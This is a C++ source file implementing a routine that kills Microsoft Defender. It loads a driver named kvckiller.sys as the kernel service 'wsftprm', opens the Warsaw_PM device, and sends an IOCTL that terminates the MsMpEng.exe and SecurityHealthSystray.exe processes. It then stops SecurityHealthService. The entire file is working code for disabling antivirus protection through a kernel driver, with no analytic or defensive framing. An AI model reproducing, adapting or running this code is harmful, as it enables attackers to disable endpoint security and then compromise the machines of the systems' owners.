#include "KillerEngine.h"

#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <string>
#include <iostream>

static void StopAndDelete(SC_HANDLE hSvc) noexcept
{
    SERVICE_STATUS ss{};
    ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);

    // Wait for SERVICE_STOPPED before DeleteService to avoid zombie entry
    for (int i = 0; i < 50; ++i) {
        if (!QueryServiceStatus(hSvc, &ss)) break;
        if (ss.dwCurrentState == SERVICE_STOPPED) break;
        Sleep(100);
    }

    DeleteService(hSvc);
}

static bool EnableLoadDriver() noexcept
{
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;
    TOKEN_PRIVILEGES tp{};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    bool ok = LookupPrivilegeValueW(nullptr, SE_LOAD_DRIVER_NAME, &tp.Privileges[0].Luid) &&
              AdjustTokenPrivileges(hToken, FALSE, &tp, 0, nullptr, nullptr) &&
              GetLastError() != ERROR_NOT_ALL_ASSIGNED;
    CloseHandle(hToken);
    return ok;
}

// Resolve \SystemRoot\ or \??\C:\... style paths to absolute Win32 paths
static std::wstring ResolveSystemPath(const std::wstring& path) noexcept
{
    if (path.size() >= 12 && _wcsnicmp(path.c_str(), L"\\SystemRoot\\", 12) == 0) {
        wchar_t winDir[MAX_PATH] = {};
        GetSystemWindowsDirectoryW(winDir, MAX_PATH);
        return std::wstring(winDir) + path.substr(11);
    }
    if (path.size() >= 4 && path[0] == L'\\' && path[1] == L'?' &&
        path[2] == L'?' && path[3] == L'\\')
    {
        return path.substr(4);
    }
    return path;
}

static std::wstring QueryServiceImagePath(SC_HANDLE hSvc) noexcept
{
    DWORD needed = 0;
    QueryServiceConfigW(hSvc, nullptr, 0, &needed);
    if (needed == 0) return {};

    std::vector<BYTE> buf(needed);
    auto* cfg = reinterpret_cast<QUERY_SERVICE_CONFIGW*>(buf.data());
    if (!QueryServiceConfigW(hSvc, cfg, needed, &needed)) return {};
    if (!cfg->lpBinaryPathName) return {};
    return cfg->lpBinaryPathName;
}

// Check if an existing wsftprm service points to a valid kvckiller.sys
static bool IsValidKillerService(SC_HANDLE hSvc) noexcept
{
    std::wstring raw = QueryServiceImagePath(hSvc);
    if (raw.empty()) return false;

    std::wstring resolved = ResolveSystemPath(raw);

    // Basename must be kvckiller.sys (case-insensitive)
    size_t slash = resolved.find_last_of(L"\\/");
    std::wstring base = (slash == std::wstring::npos) ? resolved : resolved.substr(slash + 1);
    if (_wcsicmp(base.c_str(), L"kvckiller.sys") != 0) return false;

    // File must exist on disk
    return GetFileAttributesW(resolved.c_str()) != INVALID_FILE_ATTRIBUTES;
}

bool KillerEngine::KillDefender(const wchar_t* killerSysPath) noexcept
{
    EnableLoadDriver();

    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        std::wcout << L"[-] Cannot open SCM (err=" << GetLastError() << L")\n";
        return false;
    }

    SC_HANDLE hSvc      = nullptr;
    bool      ownService = false;
    bool      killerLoaded = false;

    // Check if wsftprm already exists
    hSvc = OpenServiceW(hSCM, L"wsftprm",
                        SERVICE_QUERY_CONFIG | SERVICE_START | SERVICE_STOP | DELETE);

    if (hSvc) {
        if (IsValidKillerService(hSvc)) {
            std::wcout << L"[*] Reusing existing wsftprm service (kvckiller.sys valid)\n";
            ownService = false;
        } else {
            // Invalid path — stop, delete, recreate
            std::wcout << L"[*] wsftprm exists but path invalid — recreating\n";
            StopAndDelete(hSvc);
            CloseServiceHandle(hSvc);
            hSvc = nullptr;
        }
    }

    if (!hSvc) {
        // Create fresh service pointing to the extracted driver
        hSvc = CreateServiceW(hSCM, L"wsftprm", L"wsftprm",
                              SERVICE_START | SERVICE_STOP | DELETE | SERVICE_QUERY_CONFIG,
                              SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
                              SERVICE_ERROR_NORMAL, killerSysPath,
                              nullptr, nullptr, nullptr, nullptr, nullptr);
        if (hSvc) {
            ownService = true;
        } else {
            std::wcout << L"[-] CreateService wsftprm failed (err=" << GetLastError() << L")\n";
            CloseServiceHandle(hSCM);
            return false;
        }
    }

    if (StartServiceW(hSvc, 0, nullptr) || GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
        killerLoaded = true;
    else
        std::wcout << L"[-] StartService wsftprm failed (err=" << GetLastError() << L")\n";

    if (killerLoaded) {
        HANDLE hDev = CreateFileW(L"\\\\.\\Warsaw_PM",
                                  GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                                  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hDev != INVALID_HANDLE_VALUE) {
            static constexpr const wchar_t* killTargets[] = {
                L"MsMpEng.exe", L"SecurityHealthSystray.exe"
            };
            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnap != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32W pe{ sizeof(pe) };
                if (Process32FirstW(hSnap, &pe)) {
                    do {
                        for (const wchar_t* target : killTargets) {
                            if (_wcsicmp(pe.szExeFile, target) == 0) {
                                std::vector<BYTE> buf(1036, 0);
                                *reinterpret_cast<DWORD*>(buf.data()) = pe.th32ProcessID;
                                DWORD ret = 0;
                                if (DeviceIoControl(hDev, 0x22201C,
                                                    buf.data(), static_cast<DWORD>(buf.size()),
                                                    nullptr, 0, &ret, nullptr))
                                    std::wcout << L"[+] " << target << L" (PID "
                                               << pe.th32ProcessID << L") terminated\n";
                                else
                                    std::wcout << L"[-] IOCTL failed for " << target
                                               << L" (err=" << GetLastError() << L")\n";
                            }
                        }
                    } while (Process32NextW(hSnap, &pe));
                }
                CloseHandle(hSnap);
            }
            CloseHandle(hDev);
        } else {
            std::wcout << L"[-] Cannot open Warsaw_PM (err=" << GetLastError() << L")\n";
        }

        // SCM-stop SecurityHealthService
        SC_HANDLE hHealth = OpenServiceW(hSCM, L"SecurityHealthService",
                                         SERVICE_STOP | SERVICE_QUERY_STATUS);
        if (hHealth) {
            SERVICE_STATUS ss{};
            ControlService(hHealth, SERVICE_CONTROL_STOP, &ss);
            CloseServiceHandle(hHealth);
        }

        // Stop wsftprm; delete only if we created it (not KVC's service)
        if (ownService)
            StopAndDelete(hSvc);
        else {
            SERVICE_STATUS ss{};
            ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
        }
    }

    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);

    return killerLoaded;
}
